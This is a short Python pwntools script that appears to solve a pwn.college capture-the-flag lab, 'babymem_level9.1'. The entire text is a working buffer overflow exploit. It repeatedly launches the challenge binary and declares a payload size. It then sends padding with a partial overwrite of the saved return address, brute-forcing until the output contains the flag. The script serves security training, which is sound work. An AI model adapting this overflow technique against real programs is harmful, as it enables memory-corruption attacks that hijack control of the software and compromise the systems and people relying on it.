from pwn import *

while True:
    p = process('/challenge/babymem_level9.1')
    p.recvuntil('Payload size:')
    # 64+8+2
    p.sendline(b'74') # easy error 

    payload = b'A' * 52  
    payload += p8(0x47)
    payload += p16(0x1F6E)
    
    p.sendline(payload)

    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break